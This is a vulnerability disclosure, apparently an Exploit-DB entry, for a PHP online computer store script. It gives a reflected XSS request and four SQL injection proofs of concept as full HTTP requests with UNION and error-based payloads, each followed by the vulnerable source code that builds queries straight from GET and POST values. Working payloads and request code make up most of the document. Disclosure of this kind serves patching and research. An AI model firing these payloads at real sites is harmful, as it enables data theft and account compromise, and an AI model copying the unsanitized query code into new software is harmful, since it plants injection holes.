### Exploit Title: Online Computer and Laptop Store - Multiple vulnerabilities
### Date: 2023-05/11
### Exploit Author: xiahao@webray.com.cn
### Vendor Homepage: https://www.sourcecodester.com
### Software Link: https://www.sourcecodester.com/download-code?nid=16397&title=Online+Computer+and+Laptop+Store+using+PHP+and+MySQL+Source+Code+Free+Download
### Version: 1.0
### Tested on: macOs 13.3.1 (a) + phpstudy


# 1.Xss vulnerability in products.php

### Sample request POC #1

```
http://10.211.55.3:8001/?p=products&search=%3Cscript%3Ealert(1)%3C/script%3E
```
### Browser Access Results
![blockchain](https://github.com/xiahao90/CVEproject/raw/main/imgs/1683794793720.jpg "Online Computer and Laptop Store - Multiple vulnerabilities")

### Related Codes /products.php
```
...
<div class="<?php echo isset($_GET['c'])? 'col-md-9': 'col-lg-10 offset-md-1' ?>">
            <div class="container-fluid p-0">
                <?php if(isset($_GET['search'])): ?>
                    <h4 class="text-center py-5"><b>Search Results for '<?php echo $_GET['search'] ?>'</b></h4>
                <?php endif; ?>
            <div class="row gx-2 gx-lg-2 row-cols-1 row-cols-md-3 row-cols-xl-4">
...
```

# 2.SQL injection vulnerability in products.php

### Sample request POC #2

```
GET /?p=products&c=%27%20UNION%20ALL%20SELECT%20NULL,NULL,CONCAT(0x717a626271,0x6b5378665945517142636658635356665470564a4a7475446563554a4e52454a6173464a426f4451,0x717a6b6a71),NULL,NULL,NULL--%20-&s= HTTP/1.1
Host: 10.211.55.3:8001
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

```
### Sqlmap running results
![blockchain](https://github.com/xiahao90/CVEproject/raw/main/imgs/1683795300603.jpg "Online Computer and Laptop Store - Multiple vulnerabilities")

### Related Codes /products.php
```
<?php 
$title = "";
$sub_title = "";
if(isset($_GET['c']) && isset($_GET['s'])){
    $cat_qry = $conn->query("SELECT * FROM categories where md5(id) = '{$_GET['c']}'");
    if($cat_qry->num_rows > 0){
        $result =$cat_qry->fetch_assoc();
        $title = $result['category'];
        $cat_description = $result['description'];
    }
 $sub_cat_qry = $conn->query("SELECT * FROM sub_categories where md5(id) = '{$_GET['s']}'");
    if($sub_cat_qry->num_rows > 0){
        $result =$sub_cat_qry->fetch_assoc();
        $sub_title = $result['sub_category'];
        $sub_cat_description = $result['description'];
    }
}
elseif(isset($_GET['c'])){
    $cat_qry = $conn->query("SELECT * FROM categories where md5(id) = '{$_GET['c']}'");
    if($cat_qry->num_rows > 0){
        $result =$cat_qry->fetch_assoc();
        $title = $result['category'];
        $cat_description = $result['description'];
    }
}
elseif(isset($_GET['s'])){
    $sub_cat_qry = $conn->query("SELECT * FROM sub_categories where md5(id) = '{$_GET['s']}'");
    if($sub_cat_qry->num_rows > 0){
        $result =$sub_cat_qry->fetch_assoc();
        $sub_title = $result['sub_category'];
        $sub_cat_description = $result['description'];
    }
}
?>
```

# 3.SQL injection vulnerability in view_product.php

### Sample request POC #3

```
GET /?p=view_product&id=' UNION ALL SELECT 49,49,49,49,49,49,49,49,CONCAT(0x7162627a71,0x4b7a41414f754952634f73526d53446571737665437179644c4f5253534255656463747063445a59,0x7176786b71)-- - HTTP/1.1
Host: 10.211.55.3:8001
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

```
### Sqlmap running results
![blockchain](https://github.com/xiahao90/CVEproject/raw/main/imgs/1683795526315.jpg "Online Computer and Laptop Store - Multiple vulnerabilities")

### Related Codes /view_product.php
```
<?php 
 $products = $conn->query("SELECT p.*,b.name as bname FROM `products` p inner join brands b on p.brand_id = b.id where md5(p.id) = '{$_GET['id']}' ");
 if($products->num_rows > 0){
     foreach($products->fetch_assoc() as $k => $v){
         $$k= stripslashes($v);
     }
     $specs_qry = $conn->query("SELECT `meta_field`, `meta_value` FROM `specification_list`  where `product_id` = '{$id}'");
     $specs = array_column($specs_qry->fetch_all(MYSQLI_ASSOC), 'meta_value', 'meta_field');
    $upload_path = base_app.'/uploads/product_'.$id;
    $img = "";
    if(is_dir($upload_path)){
        $fileO = scandir($upload_path);
        if(isset($fileO[2]))
            $img = "uploads/product_".$id."/".$fileO[2];
        // var_dump($fileO);
    }
    $inventory = $conn->query("SELECT * FROM inventory where product_id = ".$id);
    $inv = array();
    while($ir = $inventory->fetch_assoc()){
        $inv[] = $ir;
    }
    $sold = $conn->query("SELECT SUM(ol.quantity) as sold FROM order_list ol inner join orders o on o.id = ol.order_id where ol.product_id='{$id}' and o.`status` != 4 ");
    $sold = $sold->num_rows > 0 ? $sold->fetch_assoc()['sold'] : 0;
 }
?>
```

# 4.SQL injection vulnerability in view_categories.php

### Sample request POC #4

```
GET /?p=view_categories&c=' UNION ALL SELECT NULL,CONCAT(0x7162706b71,0x69424d474c4c6357514a6d7a5559647757794d756677554f7146785467646b666b466249504c776f,0x717a767871),NULL,NULL,NULL-- -&s= HTTP/1.1
Host: 10.211.55.3:8001
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

```
### Sqlmap running results
![blockchain](https://github.com/xiahao90/CVEproject/raw/main/imgs/1683795682706.jpg "Online Computer and Laptop Store - Multiple vulnerabilities")

### Related Codes /view_categories.php
```
<?php 
$title = "All Product Categories";
$sub_title = "";
if(isset($_GET['c']) && isset($_GET['s'])){
    $cat_qry = $conn->query("SELECT * FROM categories where md5(id) = '{$_GET['c']}'");
    if($cat_qry->num_rows > 0){
        $title = $cat_qry->fetch_assoc()['category'];
    }
 $sub_cat_qry = $conn->query("SELECT * FROM sub_categories where md5(id) = '{$_GET['s']}'");
    if($sub_cat_qry->num_rows > 0){
        $sub_title = $sub_cat_qry->fetch_assoc()['sub_category'];
    }
}
elseif(isset($_GET['c'])){
    $cat_qry = $conn->query("SELECT * FROM categories where md5(id) = '{$_GET['c']}'");
    if($cat_qry->num_rows > 0){
        $title = $cat_qry->fetch_assoc()['category'];
    }
}
elseif(isset($_GET['s'])){
    $sub_cat_qry = $conn->query("SELECT * FROM sub_categories where md5(id) = '{$_GET['s']}'");
    if($sub_cat_qry->num_rows > 0){
        $title = $sub_cat_qry->fetch_assoc()['sub_category'];
    }
}
?>
```

# 5.SQL injection vulnerability in ./classes/Master.php

### Sample request POC #5

```
POST /classes/Master.php?f=delete_category HTTP/1.1
Host: 10.211.55.3:8001
Cache-Control: no-cache
Content-Type: application/x-www-form-urlencoded
Content-Length: 114

id=' AND GTID_SUBSET(CONCAT(0x717a6a7071,(SELECT (ELT(3659=3659,1))),0x71707a7071),3659)-- Hjjr

```
### Sqlmap running results
![blockchain](https://github.com/xiahao90/CVEproject/raw/main/imgs/1683795996688.jpg "Online Computer and Laptop Store - Multiple vulnerabilities")

### Related Codes ./classes/Master.php
```
...
	function delete_category(){
		extract($_POST);
		$del = $this->conn->query("DELETE FROM `categories` where id = '{$id}'");
		if($del){
			$resp['status'] = 'success';
			$this->settings->set_flashdata('success',"Category successfully deleted.");
		}else{
			$resp['status'] = 'failed';
			$resp['error'] = $this->conn->error;
		}
		return json_encode($resp);

	}
...
```
